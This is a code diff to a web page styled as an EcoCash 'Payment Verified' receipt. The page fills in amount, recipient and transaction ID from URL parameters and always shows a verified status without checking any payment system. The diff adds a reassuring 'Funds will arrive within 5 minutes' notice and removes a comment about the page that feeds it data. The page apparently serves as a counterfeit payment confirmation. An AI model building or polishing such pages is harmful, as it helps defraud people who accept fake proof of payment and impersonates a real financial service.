@@ -27,6 +27,7 @@
   }
   .wrap { max-width: 440px; margin: 0 auto; }
 
+  /* Header */
   .header { display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px; }
   .brand { display: inline-flex; align-items: baseline; font-weight: 900; font-size: 22px; letter-spacing: -0.6px; }
   .brand .eco { color: var(--eco-blue); }
@@ -41,15 +42,15 @@
     box-shadow: 0 10px 30px rgba(17,24,39,0.06); overflow: hidden;
   }
 
-  /* Green success header */
+  /* Success header */
   .head {
-    padding: 34px 24px 24px; text-align: center;
+    padding: 32px 24px 22px; text-align: center;
     background: linear-gradient(180deg, #F1FBF5 0%, #FFFFFF 100%);
     border-bottom: 1px solid var(--eco-border);
   }
   .tick {
-    width: 84px; height: 84px; border-radius: 50%; background: var(--eco-green); color: #fff;
-    display: inline-flex; align-items: center; justify-content: center; margin-bottom: 16px;
+    width: 82px; height: 82px; border-radius: 50%; background: var(--eco-green); color: #fff;
+    display: inline-flex; align-items: center; justify-content: center; margin-bottom: 14px;
     box-shadow: 0 0 0 8px rgba(0,166,81,0.12), 0 10px 22px rgba(0,166,81,0.28);
   }
   .tick svg { width: 40px; height: 40px; }
@@ -57,9 +58,32 @@
   .head h1 { font-size: 20px; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 4px; }
   .head p { font-size: 12.5px; color: var(--eco-muted); line-height: 1.6; }
 
+  /* 5-minute receiving notice */
+  .receiving {
+    display: flex; align-items: flex-start; gap: 10px;
+    background: #EAF4FB;
+    border: 1px solid #CCE3F4;
+    border-left: 3px solid var(--eco-blue);
+    border-radius: 10px;
+    padding: 12px 14px;
+    margin: 18px 20px 0;
+    font-size: 12.5px;
+    color: #084C7C;
+    line-height: 1.55;
+  }
+  .receiving .ic {
+    width: 22px; height: 22px; border-radius: 50%;
+    background: var(--eco-blue); color: #fff;
+    display: inline-flex; align-items: center; justify-content: center;
+    flex-shrink: 0;
+  }
+  .receiving .ic svg { width: 12px; height: 12px; stroke-width: 3; stroke: #fff; fill: none; }
+  .receiving .txt strong { font-weight: 800; display: block; margin-bottom: 2px; color: #0A4A7A; }
+  .receiving .txt span { color: #1B6A98; }
+
   /* Amount block */
   .amount-block {
-    padding: 22px 24px; text-align: center;
+    padding: 22px 24px 20px; text-align: center;
     border-bottom: 1px solid var(--eco-border);
   }
   .amount-label {
@@ -151,12 +175,14 @@
     .card { box-shadow: none; border: 1px solid #ccc; }
     .head { background: #fff; }
     .tick { box-shadow: none; }
+    .receiving { border: 1px solid #ccc; background: #fafafa; }
   }
 
   @media (max-width: 380px) {
     .amount-value { font-size: 26px; }
     .head h1 { font-size: 18px; }
     .actions { grid-template-columns: 1fr; }
+    .receiving { margin: 14px 16px 0; font-size: 12px; }
   }
 </style>
 </head>
@@ -176,6 +202,17 @@
       </div>
       <h1>Payment Verified</h1>
       <p>Your transaction was approved and verified.</p>
+    </div>
+
+    <!-- 5-minute receiving notice -->
+    <div class="receiving" id="receiving">
+      <span class="ic">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 14"/></svg>
+      </span>
+      <div class="txt">
+        <strong>Funds will arrive within 5 minutes</strong>
+        <span>You will receive the amount in your EcoCash wallet shortly. Please keep this receipt for your records.</span>
+      </div>
     </div>
 
     <div class="amount-block">
@@ -208,7 +245,6 @@
 <script>
   /* ============================================================
      Read transaction data from the URL
-     verification.html sends: ?tx=…&am=…&cur=…&rn=…&c=…
   ============================================================ */
   const params = new URLSearchParams(location.search);
   const data = {
@@ -253,11 +289,12 @@
     document.getElementById('amtVal').textContent = Number(data.am || 0).toFixed(2);
 
     const rows = [
-      { k: 'Status',         v: 'Payment Verified',            cls: 'success' },
-      { k: 'Transaction ID', v: data.tx,                       mono: true },
-      { k: 'Recipient',      v: data.rn || '—' },
-      { k: 'Country',        v: data.c  || '—' },
-      { k: 'Verified on',    v: formatDate() }
+      { k: 'Status',          v: 'Payment Verified',           cls: 'success' },
+      { k: 'Transaction ID',  v: data.tx,                      mono: true },
+      { k: 'Recipient',       v: data.rn || '—' },
+      { k: 'Country',         v: data.c  || '—' },
+      { k: 'Verified on',     v: formatDate() },
+      { k: 'Expected arrival', v: 'Within 5 minutes' }
     ];
 
     document.getElementById('details').innerHTML = rows.map(r => {
@@ -281,7 +318,8 @@
       'Transaction ID: ' + data.tx,
       'Recipient: ' + (data.rn || '—'),
       'Country: ' + (data.c || '—'),
-      'Verified on: ' + formatDate()
+      'Verified on: ' + formatDate(),
+      'Expected arrival: within 5 minutes'
     ].join('\n');
 
     const done = () => showToast('Receipt copied to clipboard.');
